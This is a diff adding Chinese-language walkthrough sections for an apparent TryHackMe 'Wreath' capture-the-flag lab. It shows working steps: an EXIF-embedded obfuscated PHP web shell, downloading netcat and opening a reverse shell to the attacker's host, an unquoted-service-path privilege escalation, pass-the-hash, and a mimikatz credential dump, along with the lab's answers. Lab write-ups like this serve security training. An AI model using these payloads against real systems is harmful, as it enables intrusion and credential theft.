@@ -445,7 +445,7 @@ PORT     STATE SERVICE       REASON
 
 # Task 18  Git Server Pivoting
 
-用ssh做一个动态端口转发
+用sshuttle做一个流量隧道直接访问内网
 
 ```
 sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 10.200.101.0/24 -x 10.200.101.200
@@ -767,6 +767,14 @@ Supplemental Credentials:
 
 > i<3ruby
 
+
+管理员哈希登录：
+
+```
+evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.101.150
+```
+
+
 # Task 24  Command and Control Empire: Overview
 
 > Can we get an agent back from the git server directly (Aye/Nay)?
@@ -956,5 +964,614 @@ Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds
 
 > PHP 7.4.11
 
+
+# Task 35  Personal PC The Wonders of Git
+
+重建项目
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# GitTools/Extractor/extractor.sh . Website
+###########
+# Extractor is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances. 
+# Only for educational purposes!
+###########
+[*] Destination folder does not exist
+[*] Creating...
+
+```
+
+
+查看提交
+```
+┌──(root💀kali)-[~/tryhackme/Wreath/Website]
+└─# separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
+
+
+=======================================
+0-70dde80cc19ec76704567996738894828f4ee895
+tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
+author twreath <me@thomaswreath.thm> 1604849458 +0000
+committer twreath <me@thomaswreath.thm> 1604849458 +0000
+
+Static Website Commit
+
+
+=======================================
+1-345ac8b236064b431fa43f53d91c98c4834ef8f3
+tree c4726fef596741220267e2b1e014024b93fced78
+parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+author twreath <me@thomaswreath.thm> 1609614315 +0000
+committer twreath <me@thomaswreath.thm> 1609614315 +0000
+
+Updated the filter
+
+
+=======================================
+2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
+tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
+parent 70dde80cc19ec76704567996738894828f4ee895
+author twreath <me@thomaswreath.thm> 1608592351 +0000
+committer twreath <me@thomaswreath.thm> 1608592351 +0000
+
+Initial Commit for the back-end
+
+
+=======================================
+
+```
+
+# Task 36  Personal PC Website Code Analysis
+
+
+唯一的php源码
+```
+┌──(root💀kali)-[~/tryhackme/Wreath/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3]
+└─# cat ./resources/index.php                    
+
+<?php
+
+        if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
+                $target = "uploads/".basename($_FILES["file"]["name"]);
+                $goodExts = ["jpg", "jpeg", "png", "gif"];
+                if(file_exists($target)){
+                        header("location: ./?msg=Exists");
+                        die();
+                }
+                $size = getimagesize($_FILES["file"]["tmp_name"]);
+                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
+                        header("location: ./?msg=Fail");
+                        die();
+                }
+                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
+                header("location: ./?msg=Success");
+                die();
+        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
+                header("location: ./?msg=Method");
+        }
+
+
+        if(isset($_GET["msg"])){
+                $msg = $_GET["msg"];
+                switch ($msg) {
+                        case "Success":
+                                $res = "File uploaded successfully!";
+                                break;
+                        case "Fail":
+                                $res = "Invalid File Type";
+                                break;
+                        case "Exists":
+                                $res = "File already exists";
+                                break;
+                        case "Method":
+                                $res = "No file send";
+                                break;
+
+                }
+        }
+?>
+<!DOCTYPE html>
+<html lang=en>
+        <!-- ToDo:
+                  - Finish the styling: it looks awful
+                  - Get Ruby more food. Greedy animal is going through it too fast
+                  - Upgrade the filter on this page. Can't rely on basic auth for everything
+                  - Phone Mrs Walker about the neighbourhood watch meetings
+        -->
+        <head>
+                <title>Ruby Pictures</title>
+                <meta charset="utf-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
+                <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
+        </head>
+        <body>
+                <main>
+                        <h1>Welcome Thomas!</h1>
+                        <h2>Ruby Image Upload Page</h2>
+                        <form method="post" enctype="multipart/form-data">
+                                <input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
+                                <input type="submit" name="upload" id="fileSubmit" value="Upload">
+                        </form>
+                        <p id=res><?php if (isset($res)){ echo $res; };?></p>
+                </main>
+        </body>
+</html>
+
+```
+
+> What does Thomas have to phone Mrs Walker about?
+
+> neighbourhood watch meetings
+
+> Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
+
+> basic auth
+
+> Which extensions are accepted (comma separated, no spaces or quotes)?
+
+> jpg,jpeg,png,gift
+
+# Task 37  Personal PC Exploit PoC
+
+使用exiftool把php代码写进图片注释
+
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# exiftool test-max.jpeg.php 
+ExifTool Version Number         : 12.39
+File Name                       : test-max.jpeg.php
+Directory                       : .
+File Size                       : 49 KiB
+File Modification Date/Time     : 2022:08:25 01:57:37-04:00
+File Access Date/Time           : 2022:08:25 01:57:37-04:00
+File Inode Change Date/Time     : 2022:08:25 01:57:37-04:00
+File Permissions                : -rw-------
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 1646
+Image Height                    : 254
+Bit Depth                       : 8
+Color Type                      : RGB with Alpha
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+SRGB Rendering                  : Perceptual
+Gamma                           : 2.2
+Pixels Per Unit X               : 3779
+Pixels Per Unit Y               : 3779
+Pixel Units                     : meters
+Image Size                      : 1646x254
+Megapixels                      : 0.418
+                                                                                                                                                                                                                                            
+
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-max.jpeg.php
+    1 image files updated
+                                                                                                                                                                                                                                            
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# exiftool test-max.jpeg.php                                                             
+ExifTool Version Number         : 12.39
+File Name                       : test-max.jpeg.php
+Directory                       : .
+File Size                       : 49 KiB
+File Modification Date/Time     : 2022:08:25 01:58:59-04:00
+File Access Date/Time           : 2022:08:25 01:58:59-04:00
+File Inode Change Date/Time     : 2022:08:25 01:58:59-04:00
+File Permissions                : -rw-------
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 1646
+Image Height                    : 254
+Bit Depth                       : 8
+Color Type                      : RGB with Alpha
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+SRGB Rendering                  : Perceptual
+Gamma                           : 2.2
+Pixels Per Unit X               : 3779
+Pixels Per Unit Y               : 3779
+Pixel Units                     : meters
+Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
+Image Size                      : 1646x254
+Megapixels                      : 0.418
+
+```
+
+上传以后访问：
+
+1661407413964.jpg
+
+# Task 38  AV Evasion Introduction
+
+> Which category of evasion covers uploading a file to the storage on the target before executing it?
+
+> On-Disk evasion
+
+> What does AMSI stand for?
+
+> Anti-Malware Scan Interface
+
+> Which category of evasion does AMSI affect?
+
+> In-Memory evasion
+
+# Task 39  AV Evasion AV Detection Methods
+
+> What other name can be used for Dynamic/Heuristic detection methods?
+
+> Behavioural
+
+> If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?
+
+> static 
+
+> When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?
+
+> Pre-defined rules
+
+> What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
+
+> Password
+
+# Task 40  AV Evasion PHP Payload Obfuscation
+
+源代码：
+```
+<?php
+    $cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+
+去到[这个网站](https://www.gaijin.at/en/tools/php-obfuscator)混淆代码
+
+得到
+```
+<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
+```
+
+对$符号进行转义
+```
+<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
+```
+
+
+写入注释
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" test-max.jpeg.php                                            130 ⨯
+    1 image files updated
+
+```
+
+> What is the Host Name of the target?
+
+> WREATH-PC
+
+> What is our current username (include the domain in this)?
+
+> wreath-pc\thomas
+
+# Task 41  AV Evasion Compiling Netcat & Reverse Shell!
+
+> What output do you get when running the command: certutil.exe?
+
+> CertUtil: -dump command completed successfully.
+
+
+分别在web shell上执行命令
+```
+curl http://10.50.102.104:8000/nc64.exe -o c:\\windows\\temp\\nc-max.exe
+
+powershell.exe c:\\windows\\temp\\nc-max.exe 10.50.102.104 443 -e cmd.exe
+```
+
+
+收到nc的rev shell
+```
+──(root💀kali)-[~/tryhackme/Wreath]
+└─# nc -lnvp 443                          
+listening on [any] 443 ...
+connect to [10.50.102.104] from (UNKNOWN) [10.200.101.100] 51276
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>whoami
+whoami
+wreath-pc\thomas
+
+```
+
+# Task 42  AV Evasion Enumeration
+
+未加双引号的路径服务：SystemExplorerHelpService
+```
+S C:\xampp\htdocs\resources\uploads> sc.exe qc SystemExplorerHelpService
+sc.exe qc SystemExplorerHelpService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\xampp\htdocs\resources\uploads> powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+
+```
+
+检查文件夹权限
+```
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
+Owner  : BUILTIN\Administrators
+Group  : WREATH-PC\None
+Access : BUILTIN\Users Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         BUILTIN\Users Allow  ReadAndExecute, Synchronize
+         BUILTIN\Users Allow  -1610612736
+         CREATOR OWNER Allow  268435456
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
+Audit  : 
+Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
+         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
+         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
+         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
+         ;;S-1-15-2-2)
+
+
+
+
+```
+
+
+>  One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?
+
+> SeImpersonatePrivilege
+
+> What is the Name (second column from the left) of this service?
+
+> SystemExplorerHelpService
+
+# Task 43  AV Evasion Privilege Escalation
+
+
+准备一份C#代码:Wrapper.cs
+```
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+            Process proc = new Process();
+			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-max.exe", "10.50.102.104 443 -e cmd.exe");
+			procInfo.CreateNoWindow = true;
+			proc.StartInfo = procInfo;
+			proc.Start();
+        }
+    }
+}
+```
+
+
+kali上编译上面的c#代码
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# mcs Wrapper.cs
+
+```
+
+
+拷贝到靶机,并移动到目标服务路径
+```
+PS C:\xampp\htdocs\resources\uploads> copy \\10.50.102.104\share\Wrapper.exe
+copy \\10.50.102.104\share\Wrapper.exe
+
+
+PS C:\xampp\htdocs\resources\uploads> copy Wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"
+copy Wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"
+
+PS C:\xampp\htdocs\resources\uploads> dir "C:\Program Files (x86)\System Explorer\"
+dir "C:\Program Files (x86)\System Explorer\"
+
+
+    Directory: C:\Program Files (x86)\System Explorer
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       21/12/2020     23:55                System Explorer                                                       
+-a----       25/08/2022     09:15           3584 System.exe   
+```
+
+重启靶机，触发服务
+```
+PS C:\xampp\htdocs\resources\uploads> sc.exe stop SystemExplorerHelpService
+sc.exe stop SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x1388
+
+PS C:\xampp\htdocs\resources\uploads> sc.exe start SystemExplorerHelpService
+sc.exe start SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1768
+        FLAGS              : 
+
+```
+
+
+收到system shell
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# nc -lnvp 443                                                                                           130 ⨯
+listening on [any] 443 ...
+connect to [10.50.102.104] from (UNKNOWN) [10.200.101.100] 51593
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+```
+
+
+# Task 44  Exfiltration Exfiltration Techniques & Post Exploitation
+
+反弹一个CS的beacon，dump出哈希
+
+```
+beacon> mimikatz lsadump::sam
+[*] Tasked beacon to run mimikatz's lsadump::sam command
+[+] host called home, sent: 750702 bytes
+[+] received output:
+Domain : WREATH-PC
+SysKey : fce6f31c003e4157e8cb1bc59f4720e6
+Local SID : S-1-5-21-3963238053-2357614183-4023578609
+
+SAMKey : 2cd4ce2e61c42d1ee27e0bd1de2bf11b
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: a05c3c807ceeb48c47252568da284cd2
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 0a694ecc8e6294041abed05d4c9e5cb2
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-OG0LO2IQ9I7Administrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : f1612b31cfe080b4d0e0bcff5a3049ae7f2640319157d1ee3a1ee6544885c732
+      aes128_hmac       (4096) : 50a8ad0913485e14756ed79b531d046b
+      des_cbc_md5       (4096) : ba4fd00e377a91f2
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-OG0LO2IQ9I7Administrator
+    Credentials
+      des_cbc_md5       : ba4fd00e377a91f2
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 06e57bdd6824566d79f127fa0de844e2
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : fe693b3a96c19410ed730bce6583f109
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 434ccdbaad5bf1066e9e56eac86ddea99db2520cbcbecc35678d9bc608d83e6c
+      aes128_hmac       (4096) : e1830b8eb1fd5a27092271b0bfb35e75
+      des_cbc_md5       (4096) : e380376e83e3d508
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : e380376e83e3d508
+
+
+RID  : 000003e8 (1000)
+User : Thomas
+  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 2298a010653c1b09328fbb2c095fa48f
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WREATH-PCThomas
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 040ebd93c718ce8265ced3af665f1193a0d0b8d5bf3dc6b89e283b0c3d8917ac
+      aes128_hmac       (4096) : 7fa029a3fcaef80fb9161e0ffa095240
+      des_cbc_md5       (4096) : 51e651458345375e
+    OldCredentials
+      aes256_hmac       (4096) : 6011a2cdbc6cd6d63797a98a0921b5dce5b36a1bd21e42bea9fad15cce7a49ff
+      aes128_hmac       (4096) : 1e3bce4f5bd2c84b455895d59189c4ff
+      des_cbc_md5       (4096) : 9e644f8a8c437301
+    OlderCredentials
+      aes256_hmac       (4096) : 1332e489a1b4f1d431968a4de3efefeb092fdb1ceb4b2b99c8f5308f3bab1558
+      aes128_hmac       (4096) : 02244721e90ff7b9e3c6fd1a0c0db391
+      des_cbc_md5       (4096) : b99be0a15402b62f
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WREATH-PCThomas
+    Credentials
+      des_cbc_md5       : 51e651458345375e
+    OldCredentials
+      des_cbc_md5       : 9e644f8a8c437301
+```
+
+> Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?
+
+> nay
+
+> For what reason is HTTPS preferred over HTTP during exfiltration?
+
+> encryption
+
+> What is the Administrator NT hash for this target?
+
+> a05c3c807ceeb48c47252568da284cd2
 
 
